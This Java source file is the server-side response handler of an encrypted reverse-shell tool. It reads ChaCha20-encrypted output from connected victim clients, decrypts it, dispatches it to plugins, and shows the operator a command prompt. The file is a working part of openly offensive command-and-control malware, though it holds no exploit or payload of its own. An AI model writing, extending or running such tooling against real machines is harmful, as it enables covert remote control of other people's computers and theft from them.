package obs1d1anc1ph3r.reverseshell.server.responsehandling;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.server.encryption.ChaCha20Server;
import obs1d1anc1ph3r.reverseshell.server.plugins.reactive.ReactivePluginManager;
import obs1d1anc1ph3r.reverseshell.server.plugins.reactive.utils.ReactiveCommandPlugin;

public class ResponseHandler implements Runnable {

	private final DataInputStream dataIn;
	private final DataOutputStream dataOut;
	private final Socket clientSocket;
	private final byte[] encryptionKey;
	private final ReactivePluginManager pluginManager;

	public ResponseHandler(DataInputStream dataIn, DataOutputStream dataOut, Socket clientSocket, byte[] encryptionKey) {
		this.dataIn = dataIn;
		this.dataOut = dataOut;
		this.clientSocket = clientSocket;
		this.encryptionKey = encryptionKey;
		this.pluginManager = new ReactivePluginManager();
	}

	@Override
	public void run() {
		try {
			handleResponses();
		} catch (IOException e) {
			handleIOException(e);
		} catch (Exception ex) {
			logException(ex);
		} finally {
			cleanup();
		}
	}

	private void handleResponses() throws IOException, Exception {
		while (true) {
			String response = readAndDecryptResponse();
			if (response == null) {
				return;
			}

			executeResponse(response);
		}
	}

	private String readAndDecryptResponse() throws IOException, Exception {
		int length = dataIn.readInt();
		if (length <= 12) {
			return logAndExit("[ERROR] Invalid packet length: " + length);
		}

		byte[] receivedNonce = readBytes(12);
		byte[] encryptedData = readBytes(length - 12);

		return decryptResponse(receivedNonce, encryptedData);
	}

	private byte[] readBytes(int length) throws IOException {
		byte[] buffer = new byte[length];
		dataIn.readFully(buffer);
		return buffer;
	}

	private String decryptResponse(byte[] nonce, byte[] encryptedData) throws Exception {
		byte[] decryptedData = ChaCha20Server.decrypt(encryptionKey, nonce, encryptedData);
		return new String(decryptedData);
	}

	private void executeResponse(String response) throws IOException, Exception {
		ReactiveCommandPlugin plugin = pluginManager.getPluginReactive(response);
		if (plugin != null) {
			plugin.execute(dataIn, dataOut, encryptionKey, clientSocket);
			return;
		}

		printResponse(response);
	}

	private void printResponse(String response) {
		for (String line : response.split("\\R")) {
			System.out.println(line);
		}
		System.out.print("[-] Command> ");
	}

	private String logAndExit(String message) {
		System.err.println(message);
		return null;
	}

	private void handleIOException(IOException e) {
		if (e instanceof java.net.SocketException) {
			System.err.println("[ERROR] Connection closed by client: " + e.getMessage());
		} else {
			System.err.println("[ERROR] Error reading response: " + e.getMessage());
		}
	}

	private void logException(Exception ex) {
		Logger.getLogger(ResponseHandler.class.getName()).log(Level.SEVERE, null, ex);
	}

	private void cleanup() {
		closeResources();
		System.out.println("[*] ResponseHandler thread exiting.");
	}

	private void closeResources() {
		try {
			dataIn.close();
			dataOut.close();
			if (!clientSocket.isClosed()) {
				clientSocket.close();
			}
		} catch (IOException e) {
			System.err.println("[ERROR] Error closing resources: " + e.getMessage());
		}
	}
}
